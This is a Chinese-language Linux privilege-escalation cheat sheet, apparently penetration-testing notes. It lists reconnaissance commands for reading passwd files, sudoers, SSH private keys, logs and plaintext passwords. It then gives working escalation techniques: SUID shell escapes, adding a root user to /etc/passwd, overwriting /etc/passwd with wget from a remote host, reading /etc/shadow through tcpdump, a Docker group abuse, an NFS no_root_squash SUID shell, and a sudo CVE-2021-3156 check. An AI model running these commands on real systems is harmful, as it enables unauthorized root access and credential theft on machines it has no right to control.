[参考资料](https://hackerqwq.github.io/2021/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87%E4%BA%8C-Linux%E6%8F%90%E6%9D%83/#Linux%E6%8F%90%E6%9D%83%E6%A6%82%E8%BF%B0)

## 信息收集

### 内核，操作系统，设备信息

>uname -a 打印所有可用的系统信息  
>uname -r 内核版本  
>uname -n 系统主机名。  
>uname -m 查看系统内核架构（64位/32位）  
>hostname 系统主机名  
>cat /proc/version 内核信息  
>cat /etc/*-release 分发信息  
>cat /etc/issue 分发信息  
>cat /proc/cpuinfo CPU信息  
>cat /etc/lsb-release # Debian  
>cat /etc/redhat-release # Redhat  
>ls /boot | grep vmlinuz-

### 用户和群组

>cat /etc/passwd     列出系统上的所有用户
>cat /var/mail/root
>cat /var/spool/mail/root
>cat /etc/group      列出系统上的所有组
>grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'      列出所有的超级用户账户
>whoami              查看当前用户
>w                   谁目前已登录，他们正在做什么
>last                最后登录用户的列表
>lastlog             所有用户上次登录的信息
>lastlog –u %username%  有关指定用户上次登录的信息
>lastlog |grep -v "Never"  以前登录用户的完

### 用户权限信息

>whoami 当前用户名  
>id 当前用户信息  
>cat /etc/sudoers 谁被允许以root身份执行  
>sudo -l 当前用户可以以root身份执行操作

### 环境信息

>env 显示环境变量  
>set 现实环境变量  
>echo %PATH 路径信息  
>history 显示当前用户的历史命令记录  
>pwd 输出工作目录  
>cat /etc/profile 显示默认系统变量  
>cat /etc/shells 显示可用的shellrc  
>cat /etc/bashrc  
>cat ~/.bash_profile  
>cat ~/.bashrc  
>cat ~/.bash_logout

### 进程和服务

>ps aux  
>ps -ef  
>top  
>cat /etc/services
>#查看以root 运行的进程
>ps aux | grep root  
>ps -ef | grep root

### 查看安装的软件

>ls -alh /usr/bin/  
>ls -alh /sbin/  
>ls -alh /var/cache/yum/  
>dpkg -l

### 服务/插件

>cat /etc/syslog.conf  
>cat /etc/chttp.conf  
>cat /etc/lighttpd.conf  
>cat /etc/cups/cupsd.conf  
>cat /etc/inetd.conf  
>cat /etc/apache2/apache2.conf  
>cat /etc/my.conf  
>cat /etc/httpd/conf/httpd.conf  
>cat /opt/lampp/etc/httpd.conf  
>ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

### 计划任务

>crontab -l  
>ls -alh /var/spool/cron  
>ls -al /etc/ | grep cron  
>ls -al /etc/cron*  
>cat /etc/cron*  
>cat /etc/at.allow  
>cat /etc/at.deny  
>cat /etc/cron.allow  
>cat /etc/cron.deny  
>cat /etc/crontab  
>cat /etc/anacrontab  
>cat /var/spool/cron/crontabs/root

### 有无明文存放用户密码

>grep -i user [filename]  
>grep -i pass [filename]  
>grep -C 5 "password" [filename]  
>find , -name "*.php" -print0 | xargs -0 grep -i -n "var $password"

### 有无ssh 私钥

>cat ~/.ssh/authorized_keys  
>cat ~/.ssh/identity.pub  
>cat ~/.ssh/identity  
>cat ~/.ssh/id_rsa.pub  
>cat ~/.ssh/id_rsa  
>cat ~/.ssh/id_dsa.pub  
>cat ~/.ssh/id_dsa  
>cat /etc/ssh/ssh_config  
>cat /etc/ssh/sshd_config  
>cat /etc/ssh/ssh_host_dsa_key.pub  
>cat /etc/ssh/ssh_host_dsa_key  
>cat /etc/ssh/ssh_host_rsa_key.pub  
>cat /etc/ssh/ssh_host_rsa_key  
>cat /etc/ssh/ssh_host_key.pub  
>cat /etc/ssh/ssh_host_key

### 查看当前机器通信的其他用户或者主机

>lsof -i  
>lsof -i :80  
>grep 80 /etc/services  
>netstat -antup  
>netstat -antpx  
>netstat -tulpn  
>chkconfig --list  
>chkconfig --list | grep 3:on  
>lastw

### 日志文件

>cat /var/log/boot.log  
>cat /var/log/cron  
>cat /var/log/syslog  
>cat /var/log/wtmp  
>cat /var/run/utmp  
>cat /etc/httpd/logs/access_log  
>cat /etc/httpd/logs/access.log  
>cat /etc/httpd/logs/error_log  
>cat /etc/httpd/logs/error.log  
>cat /var/log/apache2/access_log  
>cat /var/log/apache2/access.log  
>cat /var/log/apache2/error_log  
>cat /var/log/apache2/error.log  
>cat /var/log/apache/access_log  
>cat /var/log/apache/access.log  
>cat /var/log/auth.log  
>cat /var/log/chttp.log  
>cat /var/log/cups/error_log  
>cat /var/log/dpkg.log  
>cat /var/log/faillog  
>cat /var/log/httpd/access_log  
>cat /var/log/httpd/access.log  
>cat /var/log/httpd/error_log  
>cat /var/log/httpd/error.log  
>cat /var/log/lastlog  
>cat /var/log/lighttpd/access.log  
>cat /var/log/lighttpd/error.log  
>cat /var/log/lighttpd/lighttpd.access.log  
>cat /var/log/lighttpd/lighttpd.error.log  
>cat /var/log/messages  
>cat /var/log/secure  
>cat /var/log/syslog  
>cat /var/log/wtmp  
>cat /var/log/xferlog  
>cat /var/log/yum.log  
>cat /var/run/utmp  
>cat /var/webmin/miniserv.log  
>cat /var/www/logs/access_log  
>cat /var/www/logs/access.log  
>ls -alh /var/lib/dhcp3/  
>ls -alh /var/log/postgresql/  
>ls -alh /var/log/proftpd/  
>ls -alh /var/log/samba/  
  
### 查看可写/执行目录

>find / -writable -type d 2>/dev/null # world-writeable folders  
>find / -perm -222 -type d 2>/dev/null # world-writeable folders  
>find / -perm -o w -type d 2>/dev/null # world-writeable folders  
>find / -perm -o x -type d 2>/dev/null # world-executable folders  
>find / \( -perm -o w -perm -o x \) -type d 2>/dev/null # world-writeable & executable folders

### 查看安装过的工具

>find / -name perl*  
>find / -name python*  
>find / -name gcc*  
>...

### 提权信息收集工具

[linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
[linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
[unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
[linprivchecker.py](https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py)


## Docker提权
docker组拥有启动docker的权限，此时如果将本地磁盘映射到docker里面并且用容器内的root权限修改，就可以读取宿主机的内容甚至添加拥有sudo权限的用户

>docker run -it –rm -v /etc:/etc ubuntu /bin/bash  
>adduser test  
>usermod -aG sudo test

## SUID提权
SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。

**POC**

>find / -perm -u=s -type f 2>/dev/null
>find / -user root -perm -4000 -exec ls -ldb {} ;
>find / -user root -perm -4000 -print 2>/dev/null

### Find

>touch test
>find test -exec "whoami" \;
>find test -exec "/bin/bash" \;

### Vi/vim

>vim  
>:set shell=/bin/sh  
>:shell

### bash

>bash -p
>bash-3.2# id
>uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)

### less

>less /etc/passwd
>!/bin/sh

### more

>more /home/pelle/myfile
>!/bin/bash

### cp

>#覆盖 `/etc/shadow` 或 `/etc/passwd`
>cat /etc/passwd >passwd
>openssl passwd -1 -salt hack hack123
>$1$hack$WTn0dk2QjNeKfl.DHOUue0
>echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' >> passwd
>cp passwd /etc/passwd
>su - hack
>Password:
> id
> uid=0(hack) gid=0(root) groups=0(root)
> cat /etc/passwd|tail -1
> hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash

### mv

>覆盖 `/etc/shadow` 或 `/etc/passwd`

### awk

>awk 'BEGIN {system("/bin/sh")}'

### man

>man passwd
>!/bin/bash

### wget

>wget http://192.168.56.1:8080/passwd -O /etc/passwd

### apache

>apache2 -f /etc/shadow

### tcpdump

>echo $'id\ncat /etc/shadow' > /tmp/.test
>chmod +x /tmp/.test
>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

### python/perl/ruby/lua/php/etc

>#python
>python -c "import os;os.system('/bin/bash')"
>#perl
>exec "/bin/bash";

[SUID查询手册](https://gtfobins.github.io/#+shell)

## 内核提权

>uname -a

搜索相关内核漏洞，并编译上传

[linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
[linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)


## crontab提权

Cron任务常常以root权限运行。如果我们可以成功篡改Cron任务中定义的任何脚本或二进制文件，我们便可以使用root权限执行任意代码。

**POC**

>crontab -lls -alh /var/spool/croncat /etc/cron*

## sudo提权

由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。

影响范围

-   Sudo 1.8.2 - 1.8.31p2
-   Sudo 1.9.0 - 1.9.5p1

测试系统是否易受此漏洞影响：

1.  以非root用户身份登录系统。
2.  运行命令“sudoedit -s /”
3.  如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；如果出现以“ usage：”开的错误响应，则表示该漏洞已被补丁修复。
利用工具:[https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

## NFS提权

网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。

Root Squashing参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程root用户在连接时会分配一个用户“ _nfsnobody_ ”，该用户具有最小的本地权限。如果 no__root_squash_ 选项开启的话的话”，并为远程用户授予root用户对所连接系统的访问权限。

查看NFS服务器上的共享目录

>sudo showmount -e 10.1.1.233  

本地挂载目录，使用攻击者本地root权限创建Suid shell。
 
>sudo mkdir -p /tmp/data  
>sudo mount -t nfs 10.1.1.233:/home/bypass /tmp/data  
>cp /bin/bash /tmp/data/shell  
>chmod u+s /tmp/data/shell  

在shell上使用`shell -p`参数获取root权限
















































